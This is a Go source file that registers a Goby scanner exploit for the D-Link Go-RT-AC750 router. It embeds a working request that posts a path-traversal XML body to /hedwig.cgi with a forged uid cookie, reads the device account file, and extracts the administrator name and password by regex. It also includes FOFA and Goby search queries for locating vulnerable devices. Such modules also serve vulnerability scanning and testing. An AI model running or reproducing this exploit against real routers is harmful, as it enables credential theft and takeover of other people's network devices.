package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "D-Link Go-RT-AC750 /hedwig.cgi Information Disclosure Vulnerability",
    "Description": "<p>D-Link is committed to providing high-quality network solutions for consumers and businesses of all sizes around the world, and the D-Link Go-RT-AC750 is a dual-band wireless router. </p><p>D-Link Go-RT-AC750 /hedwig.cgi has an information leakage vulnerability that can be exploited to obtain sensitive administrator information.</p>",
    "Product": "D-Link Go-RT-AC750",
    "Homepage": "https://eu.dlink.com/uk/en",
    "DisclosureDate": "2024-06-14",
    "PostTime": "2024-06-14",
    "Author": "1070488180@qq.com",
    "FofaQuery": "body=\"class=\\\"modelname\\\">GO-RT-AC750\"",
    "GobyQuery": "body=\"class=\\\"modelname\\\">GO-RT-AC750\"",
    "Level": "2",
    "Impact": "<p>D-Link Go-RT-AC750 /hedwig.cgi has an information leakage vulnerability that can be exploited to obtain sensitive administrator information.</p>",
    "Recommendation": "<p>The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability:<a href=\"https://eu.dlink.com/uk/en\">https://eu.dlink.com/uk/en</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "GetUserInfo",
            "type": "select",
            "value": "GetUserInfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/hedwig.cgi",
                "follow_redirect": false,
                "header": {
                    "Cookie": "uid=123",
                    "Content-Type": "text/xml"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "==OoXxGgYy==",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<name>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<password>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/hedwig.cgi",
                "follow_redirect": false,
                "header": {
                    "Cookie": "uid=123",
                    "Content-Type": "text/xml"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "UserName|lastbody|regex|<name>(.*?)</name>",
                "Password|lastbody|regex|<password>(.*?)</password>",
                "output|NULL|variable|用户名：{{{UserName}}}{{{CRLF}}}密码：{{{Password}}}"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.7",
    "Translation": {
        "CN": {
            "Name": "D-Link Go-RT-AC750 /hedwig.cgi 信息泄露漏洞",
            "Product": "D-Link Go-RT-AC750",
            "Description": "<p>D-Link致力为全球消费者与各规模企业提供高品质的网络解决方案，D-Link Go-RT-AC750是一款双频无线路由器。<br></p><p>D-Link Go-RT-AC750 /hedwig.cgi 存在信息泄露漏洞，攻击者可利用该漏洞获取管理员敏感信息。<br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://eu.dlink.com/uk/en\" target=\"_blank\">https://eu.dlink.com/uk/en</a><br><br></p>",
            "Impact": "<p>D-Link Go-RT-AC750 /hedwig.cgi 存在信息泄露漏洞，攻击者可利用该漏洞获取管理员敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "D-Link Go-RT-AC750 /hedwig.cgi Information Disclosure Vulnerability",
            "Product": "D-Link Go-RT-AC750",
            "Description": "<p>D-Link is committed to providing high-quality network solutions for consumers and businesses of all sizes around the world, and the D-Link Go-RT-AC750 is a dual-band wireless router.&nbsp;</p><p>D-Link Go-RT-AC750 /hedwig.cgi has an information leakage vulnerability that can be exploited to obtain sensitive administrator information.<br></p>",
            "Recommendation": "<p>The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability:<a href=\"https://eu.dlink.com/uk/en\" target=\"_blank\">https://eu.dlink.com/uk/en</a><br></p>",
            "Impact": "<p>D-Link Go-RT-AC750 /hedwig.cgi has an information leakage vulnerability that can be exploited to obtain sensitive administrator information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10961"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}